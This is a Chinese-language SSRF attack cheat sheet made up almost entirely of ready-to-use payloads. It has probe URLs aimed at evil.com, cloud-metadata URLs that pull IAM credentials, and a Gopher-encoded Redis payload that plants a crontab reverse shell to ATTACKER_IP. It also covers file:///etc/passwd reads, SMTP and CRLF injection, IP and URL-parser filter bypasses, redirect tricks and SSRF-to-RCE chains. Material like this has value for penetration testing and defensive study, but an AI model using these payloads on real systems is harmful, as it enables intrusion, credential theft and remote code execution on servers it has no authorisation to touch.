# SSRF 服务端请求伪造实战参考

> 分类: 检测 → 内网探测 → 云元数据 → Gopher协议 → 绕过 → SSRF→RCE

---

## 1. SSRF 检测

### 1.1 常见 SSRF 触发点

```
URL参数:     ?url=http://evil.com
图片URL:     ?image=http://evil.com
文件导入:    ?import=http://evil.com
Webhook:     webhook_url=http://evil.com
PDF生成:     ?html=http://evil.com
代理接口:    ?proxy=http://evil.com
回调地址:    ?callback=http://evil.com
API聚合:     /api/fetch?url=http://evil.com
```

### 1.2 检测方法

```bash
# 在VPS上监听:
nc -lvvp 8080

# 发送请求:
?url=http://YOUR_VPS:8080/test
?url=http://YOUR_VPS:8080/

# 收到请求 → SSRF 确认
# 检查请求来源 IP → 是目标服务器IP → 确认

# DNS 检测 (不出网也能测)
?url=http://xxxxx.your-dnslog-server.com
# DNS 记录有查询 → 即使HTTP不返回,DNS也证明服务端发起请求
```

---

## 2. 内网探测

### 2.1 端口扫描

```bash
# 通过响应时间/内容差异判断端口开放
?url=http://127.0.0.1:80/       # 正常返回 → 80开放
?url=http://127.0.0.1:22/       # 超时/连接拒绝 → 22关闭
?url=http://127.0.0.1:3306/     # MySQL 返回乱码 → 3306开放

# Burp Intruder 批量探测:
# payload: 192.168.1.{1-254}:8080
# 按响应长度/响应时间排序
```

### 2.2 常见内网目标

```
127.0.0.1:22,80,443,8080,9090,3306,6379,27017,11211
192.168.0.0/16
10.0.0.0/8
172.16.0.0/12
```

---

## 3. 云元数据窃取

### 3.1 AWS

```bash
# AWS EC2 元数据 (169.254.169.254)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<IAM-Role-Name>
# → 返回 AccessKeyId + SecretAccessKey + Token

# 获取用户数据
http://169.254.169.254/latest/user-data/

# IPv6 版本 (绕过 IPv4 黑名单)
http://[fd00:ec2::254]/latest/meta-data/
```

### 3.2 其他云平台

```bash
# Google Cloud
http://metadata.google.internal/computeMetadata/v1/
# 需要 Header: Metadata-Flavor: Google
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# 需要 Header: Metadata: true

# Digital Ocean
http://169.254.169.254/metadata/v1.json

# Alibaba Cloud
http://100.100.100.200/latest/meta-data/

# Tencent Cloud
http://metadata.tencentyun.com/latest/meta-data/
```

---

## 4. Gopher 协议利用

### 4.1 Gopher 发送 TCP 原始数据

```bash
# 原理: gopher:// 可以发送任意 TCP 数据到任意端口
# → 利用 SSRF 攻击 Redis/MySQL/FastCGI 等内网服务

# Gopher 格式:
gopher://<host>:<port>/_<TCP_DATA>

# 数据需 URL 编码!!! 注意二次编码问题
```

### 4.2 Redis 未授权 → 写 Webshell / 写 SSH Key

```bash
# Redis 写 crontab (反弹Shell)
# Redis 命令 (原始):
flushall
set 1 "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\n\n"
config set dir /var/spool/cron/
config set dbfilename root
save

# 转为 Gopher (URL编码):
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$61%0d%0a%0a%0a*/1 * * * * /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1%0a%0d%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a

# 工具生成:
# https://github.com/tarunkant/Gopherus
python gopherus.py --exploit redis
```

### 4.3 MySQL 利用

```bash
# MySQL 客户端→服务端 有认证流程
# Gopherus 生成:
python gopherus.py --exploit mysql

# 也可以走:
# SSRF → MySQL → 读文件 (LOAD DATA LOCAL INFILE)
# 需 MySQL 服务端 fake server (Rogue MySQL Server)
```

---

## 5. CRLF 注入 (SSRF 中)

```bash
# 通过 CRLF 注入 HTTP 头 → 控制完整请求
?url=http://target.com/%0d%0aX-Injected:%20true%0d%0a%0d%0a<?php phpinfo();?>

# 利用场景:
# 1. 注入额外 HTTP Header
# 2. 注入 Body (SMTP 投毒)
# 3. HTTP Request Smuggling in SSRF

# SMTP 投毒:
?url=http://smtp-server:25/%0d%0aEHLO%20x%0d%0aMAIL%20FROM:<x@x.com>%0d%0aRCPT%20TO:<target@x.com>%0d%0aDATA%0d%0aFrom:<admin@x.com>%0d%0aTo:<target@x.com>%0d%0aSubject:Test%0d%0aTest%0d%0a.%0d%0a
```

---

## 6. 绕过 SSRF 限制

### 6.1 IP 地址变换

```bash
# 127.0.0.1 的变体
http://127.0.0.1
http://127.1                          # → 127.0.0.1
http://0x7f.0.0.1                     # 十六进制
http://0177.0.0.1                     # 八进制
http://2130706433                     # 十进制 → 127.0.0.1
http://0x7f000001                     # 十六进制
http://[::ffff:127.0.0.1]            # IPv4-mapped IPv6
http://[::ffff:7f00:0001]            # IPv6 变体

# DNS 重定向
# 注册域名, DNS A 记录指向 127.0.0.1
http://spoofed.burpcollaborator.net   # → 127.0.0.1
```

### 6.2 URL Schema 绕过

```bash
# 白名单只允许 http:// → 尝试其他协议
file:///etc/passwd
dict://127.0.0.1:11211/              # Memcached
gopher://127.0.0.1:6379/             # Redis
ftp://127.0.0.1:21/
sftp://127.0.0.1:22/
ldap://127.0.0.1:389/
tftp://127.0.0.1/

# URL 解析差异
http://expected.com@evil.com/        # @ → 真正连接 evil.com
http://evil.com#expected.com/         # # → 部分解析器取#前
http://evil.com?expected.com/         # ? → 同上
http://expected.com.evil.com/         # 域名包含

# Unicode / IDN 同形异义
http://ⓔⓧⓐⓜⓟⓛⓔ.com/  (Punycode → xn--...)
```

### 6.3 302 重定向绕过

```bash
# 服务端检查 URL 是白名单 → 但跟随302跳转
# 攻击者服务器:
GET /redirect HTTP/1.1
# → 302 Location: http://169.254.169.254/latest/meta-data/

# 两步跳转绕过:
# URL1: http://your-server.com/step1 → 302 → http://your-server.com/step2
# URL2: http://your-server.com/step2 → 302 → http://169.254.169.254/
# 部分SSRF只检查第1跳 → 绕过
```

---

## 7. SSRF → RCE 完整链

```
1. 发现 SSRF (出网) 
2. 内网探测 → 发现 Redis:6379 未授权
3. Gopher 协议 → Redis 写 SSH 公钥
4. SSH 登录 → RCE

或:
1. 发现 SSRF
2. 内网探测 → 发现 Solr/Elasticsearch/Hadoop/Jenkins
3. 利用对应漏洞 → RCE

或 (不出网):
1. 发现 SSRF (响应回显)
2. file:// 协议读本地文件 → 读代码/配置文件
3. 从代码中找到其他漏洞 → RCE
```

---

## 8. 盲 SSRF

### 8.1 盲SSRF检测

```
# 特征: 请求成功发送, 但不返回响应体
# 检测: DNSLog / Burp Collaborator

# 验证步骤:
1. 输入: http://your-dnslog.com → 收到DNS查询 → SSRF确认
2. 输入: http://127.0.0.1:80/ → 无DNS查询 → 可能是内网请求
3. 内网探测需要靠 时间盲注/错误消息/不同响应码
```

### 8.2 盲SSRF利用

```
# 1. 内网端口扫描 (通过超时判断)
# 2. 配合其他漏洞 (XSS/XXE) 变成非盲
# 3. 如果支持 data: 等伪协议 → 绕过HTTP限制
```

---

*参考: OWASP SSRF + PayloadAllTheThings + 实战案例*
